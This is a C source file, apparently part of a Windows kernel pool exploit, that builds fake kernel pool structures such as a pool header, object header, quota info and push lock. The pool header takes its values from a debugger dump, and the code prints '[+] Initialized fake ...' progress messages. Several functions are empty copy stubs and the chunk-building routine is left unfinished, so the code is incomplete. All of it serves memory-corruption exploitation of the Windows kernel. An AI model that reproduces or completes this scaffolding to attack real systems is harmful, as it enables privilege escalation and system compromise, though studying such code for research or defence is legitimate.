#include "exploit.h"

void initialize_pool_header(PPOOL_HEADER input_pool_header)
{
	POOL_HEADER pool_header = *input_pool_header;	// dt nt!_POOL_HEADER ffffb004f4040310

	pool_header.PreviousSize = 0;					// +0x000 PreviousSize     : 0y00000000 (0)
	pool_header.PoolIndex = 0x40;					// +0x000 PoolIndex        : 0y01000000 (0x40)
	pool_header.BlockSize = 0x44;					// +0x002 BlockSize        : 0y01000100 (0x44)
	pool_header.PoolType = 0xBB;					// +0x002 PoolType         : 0y10111011 (0xbb)
	pool_header.Ulong1 = 0xBB444000;				// +0x000 Ulong1           : 0xbb444000
	pool_header.PoolTag = 0xFFFF9E00;				// +0x004 PoolTag          : 0xffff9e00
	pool_header.ProcessBilled = (void*)0;			// +0x008 ProcessBilled    : 0xffffb004`f9f489f0 _EPROCESS
	pool_header.AllocatorBackTraceIndex = 0x89F0;	// +0x008 AllocatorBackTraceIndex : 0x89f0
	pool_header.PoolTagHash = 0xF9F4;				// +0x00a PoolTagHash      : 0xf9f4

	*input_pool_header = pool_header;
}

void initialize_object_header_quota(POBJECT_HEADER_QUOTA_INFO input_object_header_quota)
{
	OBJECT_HEADER_QUOTA_INFO object_header_quota_info = *input_object_header_quota;

	*input_object_header_quota = object_header_quota_info;
}

void initialize_ex_push_lock(PEX_PUSH_LOCK input_ex_push_lock)
{
	EX_PUSH_LOCK ex_push_lock = *input_ex_push_lock;

	*input_ex_push_lock = ex_push_lock;
}

void initialize_quad(PQUAD input_quad)
{
	QUAD quad = *input_quad;

	*input_quad = quad;
}

void initialize_object_create_information(POBJECT_CREATE_INFORMATION input_object_create_information)
{
	OBJECT_CREATE_INFORMATION object_create_information = *input_object_create_information;

	*input_object_create_information = object_create_information;
}

void initialize_object_header(POBJECT_HEADER input_object_header, PEX_PUSH_LOCK input_ex_push_lock, PVOID input_heap_allocation_address, PQUAD input_quad, POBJECT_CREATE_INFORMATION input_object_create_information)
{
	OBJECT_HEADER object_header = *input_object_header;

	*input_object_header = object_header;
}

void initialize_main_pool_structs(char* address, PPOOL_HEADER input_pool_header, POBJECT_HEADER_QUOTA_INFO input_object_header_quota, PEX_PUSH_LOCK input_push_lock, PQUAD input_quad, POBJECT_CREATE_INFORMATION input_object_create_information, POBJECT_HEADER input_object_header)
{
	initialize_pool_header(input_pool_header);
	printf("\n[+] Initialized fake pool header.");

	initialize_object_header_quota(input_object_header_quota);
	printf("\n[+] Initialized fake object header quota.");

	initialize_ex_push_lock(input_push_lock);
	printf("\n[+] Initialized fake push lock.");

	initialize_quad(input_quad);
	printf("\n[+] Initialized fake quad.");

	initialize_object_header(input_object_header, input_push_lock, address, input_quad, input_object_create_information);
	printf("\n[+] Initialized fake object header.");
}

void build_pool_chunk(char* fake_pool_memory_page, POOL_HEADER pool_header, OBJECT_HEADER_QUOTA_INFO object_header_quota_info, OBJECT_HEADER object_header)
{
	// ...
}